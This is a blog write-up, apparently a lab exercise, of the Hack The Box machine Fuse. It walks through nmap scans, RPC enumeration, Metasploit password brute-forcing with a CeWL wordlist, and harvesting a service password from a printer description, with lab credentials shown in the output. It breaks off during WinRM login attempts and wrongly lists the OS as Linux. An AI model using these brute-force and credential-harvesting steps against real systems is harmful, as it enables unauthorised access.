@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Daniel Cano">
+<meta name="description" content="Writeup about the Hackthebox retired machine Fuse 10.10.10.193">
+<meta name="keywords" content="hacking, technology, programming">
+<meta name="referrer" content="always">
+<meta property="og:description" content="Writeup about the Hackthebox retired machine Fuse 10.10.10.193">
+<meta property="og:title" content="Writeup Hackthebox HTB Fuse">
+<meta property="og:url" content="https://u915.net/posts/2020/11/writeup-hackthebox-htb-fuse/">
+<meta property="og:image" content="https://u915.net/images/logo_small.png" />
+<title>Writeup Hackthebox HTB Fuse - u915</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+<link rel="icon" href="/images/favicon.png" type="image/x-icon">
+<link rel="shortcut icon" href="/images/favicon_48_48.png">
+</head>
+<body>
+<header>
+  <div class="blog-header">
+    <h1><a href="https://u915.net/">u915</a></h1>
+    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merchán - Hacking &amp; Tech</h4>
+  </div>
+  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Writeup Hackthebox HTB Fuse</h1>
+  </div>
+<div class="meta">
+  <div class="meta-bar">2020-11-08
+  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
+      <span><a href="https://u915.net/tags/hackthebox/">#Hackthebox</a></span>
+      <span><a href="https://u915.net/tags/pentesting/">#Pentesting</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h2 id="0---basic-info">0 - Basic info</h2>
+<p>OS: Linux</p>
+<p>IP: 10.10.10.193</p>
+<h2 id="1---reconnaissance-and-enumeration">1 - Reconnaissance and enumeration</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sV -sC -O 10.10.10.193
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-05 13:24 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.193
+Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">988</span> filtered ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-08-05 11:37:55Z<span style="color:#f92672">)</span>
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: FABRICORP<span style="color:#f92672">)</span>
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp open  tcpwrapped
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>8/5%Time<span style="color:#f92672">=</span>5F2A970C%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSVe
+SF:rsionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
+</span><span style="color:#e6db74">SF:04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port                                                                                                                                      
+Device type: general purpose                                                                                                                                                                                                               
+Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2016|2012|2008|<span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>                                                                                                                                                                         
+OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607                                                                                 
+Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> or Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1607</span> <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>                                                                                                                                                                                                       
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.                                                                                                                                                                                  
+Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                       
+                                                                                                                                                                                                                                           
+Host script results:                                                                                                                                                                                                                       
+|_clock-skew: mean: 2h33m00s, deviation: 4h02m30s, median: 12m59s                                                                                                                                                                          
+| smb-os-discovery:                                                                                                                                                                                                                        
+|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3<span style="color:#f92672">)</span>                                                                                                                                                              
+|   Computer name: Fuse                                                                                                                                                                                                                    
+|   NetBIOS computer name: FUSE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>                                                                                                                                                                                                        
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System time: 2020-08-05T04:40:17-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-08-05T11:40:19
+|_  start_date: 2020-08-05T11:26:09
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 312.28 seconds
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn -n -sV --script vuln 10.10.10.193
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-05 13:41 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.193
+Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">988</span> filtered ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http         Microsoft IIS httpd 10.0
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_http-csrf: Couldn<span style="color:#e6db74">&#39;t find any CSRF vulnerabilities.
+</span><span style="color:#e6db74">|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
+|_http-server-header: Microsoft-IIS/10.0
+|_http-stored-xss: Couldn<span style="color:#960050;background-color:#1e0010">&#39;</span>t find any stored XSS vulnerabilities.
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-08-05 11:54:59Z<span style="color:#f92672">)</span>
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+135/tcp  open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_sslv2-drown: 
+445/tcp  open  microsoft-ds Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 - <span style="color:#ae81ff">2012</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: FABRICORP<span style="color:#f92672">)</span>
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+464/tcp  open  kpasswd5?
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+636/tcp  open  tcpwrapped
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_sslv2-drown: 
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_sslv2-drown: 
+3269/tcp open  tcpwrapped
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_sslv2-drown: 
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>8/5%Time<span style="color:#f92672">=</span>5F2A9B0C%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSVe
+SF:rsionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
+</span><span style="color:#e6db74">SF:04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 377.36 seconds
+</code></pre></div><p>The initial recon shows that it is a Windows machine. Due to the errors trying to navigate, I added to the /etc/hosts</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#HTB</span>
+10.10.10.193 fuse.htb fuse.fabricorp.local
+</code></pre></div><p>Searching inside looks like a printing service, inside I discovered the following users:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">users:
+pmerton
+tlavel
+sthompson
+administrator
+bhult
+</code></pre></div><p>Enumerating a little more:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host -t axfr fuse.fabricorp.local 10.10.10.193
+Trying <span style="color:#e6db74">&#34;fuse.fabricorp.local&#34;</span>
+Using domain server:
+Name: 10.10.10.193
+Address: 10.10.10.193#53
+Aliases: 
+
+Host fuse.fabricorp.local not found: 3<span style="color:#f92672">(</span>NXDOMAIN<span style="color:#f92672">)</span>
+Received <span style="color:#ae81ff">38</span> bytes from 10.10.10.193#53 in <span style="color:#ae81ff">31</span> ms
+; Transfer failed.
+</code></pre></div><p>Nothing useful</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup
+&gt; server 10.10.10.193
+Default server: 10.10.10.193
+Address: 10.10.10.193#53
+&gt; 10.10.10.193
+** server can<span style="color:#960050;background-color:#1e0010">&#39;</span>t find 193.10.10.10.in-addr.arpa: SERVFAIL
+</code></pre></div><p>Checking the smb ports</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbmap -H 10.10.10.193
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.193:445        Name: fuse.htb
+
+smbclient -L fuse.htb
+Enter WORKGROUP<span style="color:#ae81ff">\u</span>915<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+SMB1 disabled -- no workgroup available
+</code></pre></div><p>Nothing&hellip;</p>
+<p>I was stuck for a while, then I tried to generate a custom wordlist using Cewl to bruteforce the smb with the previously found users:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cewl -d <span style="color:#ae81ff">5</span> -m <span style="color:#ae81ff">3</span> -w wordlist.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
+</code></pre></div><p>Using the custom wordlist with the MSF smb scanner:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Module options <span style="color:#f92672">(</span>auxiliary/scanner/smb/smb_login<span style="color:#f92672">)</span>:
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
+   BLANK_PASSWORDS    false            no        Try blank passwords <span style="color:#66d9ef">for</span> all users
+   BRUTEFORCE_SPEED   <span style="color:#ae81ff">5</span>                yes       How fast to bruteforce, from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span>
+   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS       false            no        Add all users in the current database to the list
+   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
+   DETECT_ANY_DOMAIN  false            no        Detect <span style="color:#66d9ef">if</span> domain is required <span style="color:#66d9ef">for</span> the specified user
+   PASS_FILE          wordlist.txt     no        File containing passwords, one per line
+   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
+   Proxies                             no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
+   RHOSTS             10.10.10.193     yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+   RPORT              <span style="color:#ae81ff">445</span>              yes       The SMB service port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+   SMBDomain          .                no        The Windows domain to use <span style="color:#66d9ef">for</span> authentication
+   SMBPass                             no        The password <span style="color:#66d9ef">for</span> the specified username
+   SMBUser                             no        The username to authenticate as
+   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works <span style="color:#66d9ef">for</span> a host
+   THREADS            <span style="color:#ae81ff">1</span>                yes       The number of concurrent threads <span style="color:#f92672">(</span>max one per host<span style="color:#f92672">)</span>
+   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS       false            no        Try the username as the password <span style="color:#66d9ef">for</span> all users
+   USER_FILE          users.txt        no        File containing usernames, one per line
+   VERBOSE            true             yes       Whether to print output <span style="color:#66d9ef">for</span> all attempts
+   
+   
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.193:445      - 10.10.10.193:445 - Success: <span style="color:#e6db74">&#39;.\bhult:Fabricorp01&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.193:445      - 10.10.10.193:445 - Success: <span style="color:#e6db74">&#39;.\tlavel:&lt; &#39;</span>
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.193:445      - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed
+</code></pre></div><p>Great 2 successful attempts for the users bhult and tlavel. Using smbclient to login to the smb service:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_login<span style="color:#f92672">)</span> &gt; smbclient -L fuse.htb -U bhult
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> exec: smbclient -L fuse.htb -U bhult
+
+Enter WORKGROUP<span style="color:#ae81ff">\b</span>hult<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
+</code></pre></div><p>So the passwords must be changed. I used the amazing password Pizza33:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbpasswd -r fuse.htb -U bhult
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed <span style="color:#66d9ef">for</span> user bhult
+
+Pizza33
+</code></pre></div><p>But did not work !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">session setup failed: NT_STATUS_LOGON_FAILURE
+</code></pre></div><p>So re-thinking again I put my effort on the rpc services:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+rpcclient -L fuse.htb -U tlavel
+Enter WORKGROUP<span style="color:#ae81ff">\t</span>lavel<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+
+rpcclient $&gt; enumdomusers
+user:<span style="color:#f92672">[</span>Administrator<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f4<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>DefaultAccount<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f7<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>svc-print<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x450<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>bnielson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x451<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>sthompson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x641<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>tlavel<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x642<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>pmerton<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x643<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>svc-scan<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x645<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>bhult<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1bbd<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>dandrews<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1bbe<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>mberbatov<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1db1<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>astein<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1db2<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>dmuir<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1db3<span style="color:#f92672">]</span>
+
+rpcclient $&gt; enumprivs
+found <span style="color:#ae81ff">35</span> privileges
+
+SeCreateTokenPrivilege          0:2 <span style="color:#f92672">(</span>0x0:0x2<span style="color:#f92672">)</span>
+SeAssignPrimaryTokenPrivilege           0:3 <span style="color:#f92672">(</span>0x0:0x3<span style="color:#f92672">)</span>
+SeLockMemoryPrivilege           0:4 <span style="color:#f92672">(</span>0x0:0x4<span style="color:#f92672">)</span>
+SeIncreaseQuotaPrivilege                0:5 <span style="color:#f92672">(</span>0x0:0x5<span style="color:#f92672">)</span>
+SeMachineAccountPrivilege               0:6 <span style="color:#f92672">(</span>0x0:0x6<span style="color:#f92672">)</span>
+SeTcbPrivilege          0:7 <span style="color:#f92672">(</span>0x0:0x7<span style="color:#f92672">)</span>
+SeSecurityPrivilege             0:8 <span style="color:#f92672">(</span>0x0:0x8<span style="color:#f92672">)</span>
+SeTakeOwnershipPrivilege                0:9 <span style="color:#f92672">(</span>0x0:0x9<span style="color:#f92672">)</span>
+SeLoadDriverPrivilege           0:10 <span style="color:#f92672">(</span>0x0:0xa<span style="color:#f92672">)</span>
+SeSystemProfilePrivilege                0:11 <span style="color:#f92672">(</span>0x0:0xb<span style="color:#f92672">)</span>
+SeSystemtimePrivilege           0:12 <span style="color:#f92672">(</span>0x0:0xc<span style="color:#f92672">)</span>
+SeProfileSingleProcessPrivilege                 0:13 <span style="color:#f92672">(</span>0x0:0xd<span style="color:#f92672">)</span>
+SeIncreaseBasePriorityPrivilege                 0:14 <span style="color:#f92672">(</span>0x0:0xe<span style="color:#f92672">)</span>
+SeCreatePagefilePrivilege               0:15 <span style="color:#f92672">(</span>0x0:0xf<span style="color:#f92672">)</span>
+SeCreatePermanentPrivilege              0:16 <span style="color:#f92672">(</span>0x0:0x10<span style="color:#f92672">)</span>
+SeBackupPrivilege               0:17 <span style="color:#f92672">(</span>0x0:0x11<span style="color:#f92672">)</span>
+SeRestorePrivilege              0:18 <span style="color:#f92672">(</span>0x0:0x12<span style="color:#f92672">)</span>
+SeShutdownPrivilege             0:19 <span style="color:#f92672">(</span>0x0:0x13<span style="color:#f92672">)</span>
+SeDebugPrivilege                0:20 <span style="color:#f92672">(</span>0x0:0x14<span style="color:#f92672">)</span>
+SeAuditPrivilege                0:21 <span style="color:#f92672">(</span>0x0:0x15<span style="color:#f92672">)</span>
+SeSystemEnvironmentPrivilege            0:22 <span style="color:#f92672">(</span>0x0:0x16<span style="color:#f92672">)</span>
+SeChangeNotifyPrivilege                 0:23 <span style="color:#f92672">(</span>0x0:0x17<span style="color:#f92672">)</span>
+SeRemoteShutdownPrivilege               0:24 <span style="color:#f92672">(</span>0x0:0x18<span style="color:#f92672">)</span>
+SeUndockPrivilege               0:25 <span style="color:#f92672">(</span>0x0:0x19<span style="color:#f92672">)</span>
+SeSyncAgentPrivilege            0:26 <span style="color:#f92672">(</span>0x0:0x1a<span style="color:#f92672">)</span>
+SeEnableDelegationPrivilege             0:27 <span style="color:#f92672">(</span>0x0:0x1b<span style="color:#f92672">)</span>
+SeManageVolumePrivilege                 0:28 <span style="color:#f92672">(</span>0x0:0x1c<span style="color:#f92672">)</span>
+SeImpersonatePrivilege          0:29 <span style="color:#f92672">(</span>0x0:0x1d<span style="color:#f92672">)</span>
+SeCreateGlobalPrivilege                 0:30 <span style="color:#f92672">(</span>0x0:0x1e<span style="color:#f92672">)</span>
+SeTrustedCredManAccessPrivilege                 0:31 <span style="color:#f92672">(</span>0x0:0x1f<span style="color:#f92672">)</span>
+SeRelabelPrivilege              0:32 <span style="color:#f92672">(</span>0x0:0x20<span style="color:#f92672">)</span>
+SeIncreaseWorkingSetPrivilege           0:33 <span style="color:#f92672">(</span>0x0:0x21<span style="color:#f92672">)</span>
+SeTimeZonePrivilege             0:34 <span style="color:#f92672">(</span>0x0:0x22<span style="color:#f92672">)</span>
+SeCreateSymbolicLinkPrivilege           0:35 <span style="color:#f92672">(</span>0x0:0x23<span style="color:#f92672">)</span>
+SeDelegateSessionUserImpersonatePrivilege               0:36 <span style="color:#f92672">(</span>0x0:0x24<span style="color:#f92672">)</span>
+</code></pre></div><p>Also, the password is reset by an unknown period of time :(</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient -L fuse.htb -U tlavel
+Enter WORKGROUP<span style="color:#ae81ff">\t</span>lavel<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+result was WERR_INVALID_NAME
+</code></pre></div><h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
+<p>Finally I discovered something useful enumerating the printers:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; enumprinters
+        flags:<span style="color:#f92672">[</span>0x800000<span style="color:#f92672">]</span>
+        name:<span style="color:#f92672">[</span><span style="color:#ae81ff">\\</span>10.10.10.193<span style="color:#ae81ff">\H</span>P-MFT01<span style="color:#f92672">]</span>
+        description:<span style="color:#f92672">[</span><span style="color:#ae81ff">\\</span>10.10.10.193<span style="color:#ae81ff">\H</span>P-MFT01,HP Universal Printing PCL 6,Central <span style="color:#f92672">(</span>Near IT, scan2docs password: $fab@s3Rv1ce$1<span style="color:#f92672">)]</span>
+        comment:<span style="color:#f92672">[]</span>
+</code></pre></div><p>Great the firts Password:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$fab@s3Rv1ce$1
+</code></pre></div><p>Now I need a valid user to use the password using again the discovered users with MSF and WinRM:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 auxiliary<span style="color:#f92672">(</span>scanner/winrm/winrm_login<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No active DB -- Credential data will not be saved!
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\A</span>dministrator:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\G</span>uest:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
